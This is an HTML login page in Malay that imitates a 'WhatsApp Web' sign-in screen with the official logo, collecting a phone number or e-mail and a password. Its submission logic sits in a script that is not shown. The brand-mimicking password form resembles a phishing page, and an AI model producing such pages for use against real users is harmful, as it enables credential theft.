<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web - Log Masuk</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="login-body">
    <div class="login-container">
        <div class="login-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="whatsapp-logo">
            <h1>WhatsApp Web</h1>
        </div>
        <div class="login-card">
            <h2>Log Masuk</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Nombor Telefon atau E-mel:</label>
                    <input type="text" id="username" name="username" placeholder="Cth: +60123456789" required>
                </div>
                <div class="form-group">
                    <label for="password">Kata Laluan:</label>
                    <input type="password" id="password" name="password" placeholder="Masukkan kata laluan anda" required>
                </div>
                <button type="submit" class="btn-login">Log Masuk</button>
            </form>
            <p class="signup-link">Belum ada akaun? <a href="#">Daftar Sekarang</a></p>
        </div>
        <div class="login-footer">
            <p>&copy; 2026 WhatsApp Web. Semua Hak Cipta Terpelihara.</p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
